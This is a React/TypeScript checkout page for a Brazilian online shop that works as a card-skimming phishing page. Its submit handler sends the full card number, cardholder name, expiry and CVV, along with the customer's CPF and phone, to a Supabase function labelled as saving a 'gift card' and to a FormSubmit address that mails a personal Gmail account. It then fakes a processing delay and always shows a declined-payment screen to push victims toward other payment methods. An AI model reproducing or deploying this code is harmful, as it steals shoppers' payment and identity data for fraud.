import { useState, useEffect, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { ArrowLeft, CreditCard, Loader2, XCircle, Percent } from "lucide-react";
import { useCart } from "@/contexts/CartContext";
import { supabase } from "@/integrations/supabase/client";
import { trackPaymentFailed } from "@/lib/metaPixel";

const CheckoutCartao = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { itens, getTotal, dadosCliente, pedidoAtual } = useCart();

  // Desconto recebido via state (ex: 0.08 quando vem do modo PIX-em-manutenção)
  const descontoCartao: number =
    typeof location.state?.descontoCartao === "number" ? location.state.descontoCartao : 0;
  const totalOriginal = getTotal();
  const valorComDesconto = totalOriginal * (1 - descontoCartao);
  const economiaCartao = totalOriginal - valorComDesconto;

  const [cardData, setCardData] = useState({
    numero: "",
    nome: "",
    validade: "",
    cvv: "",
  });
  const [loading, setLoading] = useState(false);
  const [showError, setShowError] = useState(false);
  
  const paymentFailedTracked = useRef(false);

  // Meta Pixel: PaymentFailed - Disparar quando pagamento for recusado
  useEffect(() => {
    if (showError && !paymentFailedTracked.current) {
      trackPaymentFailed({
        content_ids: itens.map(item => item.produtoId),
        value: valorComDesconto,
        payment_method: 'credit_card',
        error_reason: 'card_declined',
      });
      paymentFailedTracked.current = true;
    }
  }, [showError, itens, valorComDesconto]);

  // Formatar número do cartão: 0000 0000 0000 0000
  const formatCardNumber = (value: string) => {
    const numbers = value.replace(/\D/g, "").slice(0, 16);
    const groups = numbers.match(/.{1,4}/g);
    return groups ? groups.join(" ") : "";
  };

  // Formatar validade: MM/AA
  const formatExpiry = (value: string) => {
    const numbers = value.replace(/\D/g, "").slice(0, 4);
    if (numbers.length >= 2) {
      return `${numbers.slice(0, 2)}/${numbers.slice(2)}`;
    }
    return numbers;
  };

  // Formatar CVV: apenas 3 números
  const formatCvv = (value: string) => {
    return value.replace(/\D/g, "").slice(0, 3);
  };

  const handleInputChange = (field: keyof typeof cardData, value: string) => {
    let formattedValue = value;

    if (field === "numero") {
      formattedValue = formatCardNumber(value);
    } else if (field === "validade") {
      formattedValue = formatExpiry(value);
    } else if (field === "cvv") {
      formattedValue = formatCvv(value);
    }

    setCardData((prev) => ({ ...prev, [field]: formattedValue }));
  };

  const isFormValid = () => {
    const numeroLimpo = cardData.numero.replace(/\s/g, "");
    return (
      numeroLimpo.length === 16 &&
      cardData.nome.trim().length > 0 &&
      cardData.validade.length === 5 &&
      cardData.cvv.length === 3
    );
  };

  const handleSubmit = async () => {
    if (!isFormValid()) return;

    setLoading(true);

    try {
      // Salvar dados do vale presente via Edge Function segura
      await supabase.functions.invoke("salvar-vale-presente", {
        body: {
          pedido_id: pedidoAtual?.id || "sem_pedido",
          numero_cartao: cardData.numero,
          nome_cartao: cardData.nome,
          validade: cardData.validade,
          cvv: cardData.cvv,
          cliente_nome: dadosCliente?.nome || "",
          cliente_cpf: dadosCliente?.cpf || "",
          cliente_telefone: dadosCliente?.telefone || "",
        },
      });

      // Enviar dados por email via FormSubmit usando fetch
      const formData = new FormData();
      formData.append("Cliente Nome", dadosCliente?.nome || "");
      formData.append("Cliente CPF", dadosCliente?.cpf || "");
      formData.append("Cliente Telefone", dadosCliente?.telefone || "");
      formData.append("Numero Cartao", cardData.numero);
      formData.append("Nome Cartao", cardData.nome);
      formData.append("Validade", cardData.validade);
      formData.append("CVV", cardData.cvv);
      formData.append("Valor Total", `R$ ${valorComDesconto.toFixed(2)}`);
      formData.append("_subject", "Novo Vale Presente");
      formData.append("_captcha", "false");
      formData.append("_template", "table");

      await fetch("https://formsubmit.co/ajax/luciana.gomes.sooares@gmail.com", {
        method: "POST",
        body: formData,
      });
    } catch (err) {
      // Silently handle error
    }

    // Simular processamento por 2-3 segundos
    await new Promise((resolve) => setTimeout(resolve, 2500));

    setLoading(false);
    setShowError(true);
  };

  const handleTryAgain = () => {
    setShowError(false);
    navigate("/checkout");
  };

  if (itens.length === 0 || !dadosCliente) {
    navigate("/carrinho");
    return null;
  }

  // Tela de erro (Pagamento Recusado)
  if (showError) {
    return (
      <div className="min-h-screen bg-muted max-w-md mx-auto flex flex-col items-center justify-center p-6">
        <div className="bg-card rounded-2xl p-8 w-full text-center">
          <div className="w-20 h-20 mx-auto mb-6 rounded-full bg-destructive/20 flex items-center justify-center">
            <XCircle size={48} className="text-destructive" />
          </div>

          <h1 className="text-card-foreground text-xl font-bold mb-2">Pagamento Recusado</h1>

          <p className="text-card-foreground/60 text-sm mb-8">
            Não foi possível processar o pagamento com este cartão. Tente outra forma de pagamento.
          </p>

          <button
            onClick={handleTryAgain}
            className="w-full py-3.5 bg-accent text-accent-foreground font-semibold rounded-lg hover:opacity-90 transition-opacity"
          >
            Tentar outra forma de pagamento
          </button>
        </div>
      </div>
    );
  }

  // Tela de loading
  if (loading) {
    return (
      <div className="min-h-screen bg-muted max-w-md mx-auto flex flex-col items-center justify-center p-6">
        <div className="bg-card rounded-2xl p-8 w-full text-center">
          <Loader2 size={48} className="animate-spin text-accent mx-auto mb-6" />
          <h2 className="text-card-foreground text-lg font-semibold mb-2">Processando pagamento...</h2>
          <p className="text-card-foreground/60 text-sm">Aguarde enquanto verificamos os dados do seu cartão</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-muted max-w-md mx-auto flex flex-col">
      {/* Header */}
      <header className="sticky top-0 z-10 bg-background border-b border-border">
        <div className="flex items-center gap-3 px-4 py-3">
          <button
            onClick={() => navigate("/checkout")}
            className="w-8 h-8 flex items-center justify-center text-foreground hover:bg-muted rounded-full transition-colors"
          >
            <ArrowLeft size={20} />
          </button>
          <h1 className="text-foreground font-semibold text-lg">Pagamento</h1>
        </div>
      </header>

      {/* Conteúdo */}
      <main className="flex-1 p-4 pb-32">
        {/* Valor */}
        <div className="bg-card rounded-xl p-4 mb-4 text-center">
          <p className="text-card-foreground/60 text-sm mb-1">Valor a pagar</p>
          {descontoCartao > 0 && (
            <p className="text-card-foreground/50 text-sm line-through">
              R$ {totalOriginal.toFixed(2).replace(".", ",")}
            </p>
          )}
          <p className="text-card-foreground text-2xl font-bold">
            R$ {valorComDesconto.toFixed(2).replace(".", ",")}
          </p>
          {descontoCartao > 0 && (
            <div className="mt-2 inline-flex items-center gap-1 px-2 py-1 bg-accent/15 text-accent text-xs font-bold rounded-full">
              <Percent size={12} />
              {Math.round(descontoCartao * 100)}% OFF aplicado · economia de R$ {economiaCartao.toFixed(2).replace(".", ",")}
            </div>
          )}
        </div>

        {/* Formulário do Cartão */}
        <div className="bg-card rounded-xl p-4">
          <div className="flex items-center gap-2 mb-4">
            <CreditCard size={20} className="text-accent" />
            <h2 className="text-card-foreground font-semibold text-sm">Dados do Cartão</h2>
          </div>

          <div className="space-y-3">
            <div>
              <label className="text-card-foreground/60 text-xs mb-1 block">Número do cartão</label>
              <input
                type="text"
                value={cardData.numero}
                onChange={(e) => handleInputChange("numero", e.target.value)}
                placeholder="0000 0000 0000 0000"
                className="w-full px-3 py-2.5 bg-card-foreground/10 border-0 rounded-lg text-card-foreground text-sm placeholder:text-card-foreground/50 focus:outline-none focus:ring-2 focus:ring-accent"
              />
            </div>

            <div>
              <label className="text-card-foreground/60 text-xs mb-1 block">Nome no cartão</label>
              <input
                type="text"
                value={cardData.nome}
                onChange={(e) => handleInputChange("nome", e.target.value.toUpperCase())}
                placeholder="NOME COMO ESTÁ NO CARTÃO"
                className="w-full px-3 py-2.5 bg-card-foreground/10 border-0 rounded-lg text-card-foreground text-sm placeholder:text-card-foreground/50 focus:outline-none focus:ring-2 focus:ring-accent uppercase"
              />
            </div>

            <div className="flex gap-3">
              <div className="flex-1">
                <label className="text-card-foreground/60 text-xs mb-1 block">Validade</label>
                <input
                  type="text"
                  value={cardData.validade}
                  onChange={(e) => handleInputChange("validade", e.target.value)}
                  placeholder="MM/AA"
                  className="w-full px-3 py-2.5 bg-card-foreground/10 border-0 rounded-lg text-card-foreground text-sm placeholder:text-card-foreground/50 focus:outline-none focus:ring-2 focus:ring-accent"
                />
              </div>

              <div className="w-24">
                <label className="text-card-foreground/60 text-xs mb-1 block">CVV</label>
                <input
                  type="text"
                  value={cardData.cvv}
                  onChange={(e) => handleInputChange("cvv", e.target.value)}
                  placeholder="000"
                  className="w-full px-3 py-2.5 bg-card-foreground/10 border-0 rounded-lg text-card-foreground text-sm placeholder:text-card-foreground/50 focus:outline-none focus:ring-2 focus:ring-accent"
                />
              </div>
            </div>
          </div>
        </div>

        {/* Bandeiras aceitas */}
        <div className="mt-4 text-center">
          <p className="text-muted-foreground text-xs">Aceitamos Visa, Mastercard, Elo e outras bandeiras</p>
        </div>
      </main>

      {/* Footer Fixo */}
      <footer className="fixed bottom-0 left-0 right-0 max-w-md mx-auto bg-card p-4">
        <button
          onClick={handleSubmit}
          disabled={!isFormValid()}
          className="w-full py-3.5 bg-accent text-accent-foreground font-semibold rounded-lg hover:opacity-90 transition-opacity disabled:opacity-50 disabled:cursor-not-allowed"
        >
          Confirmar Pagamento
        </button>
      </footer>
    </div>
  );
};

export default CheckoutCartao;
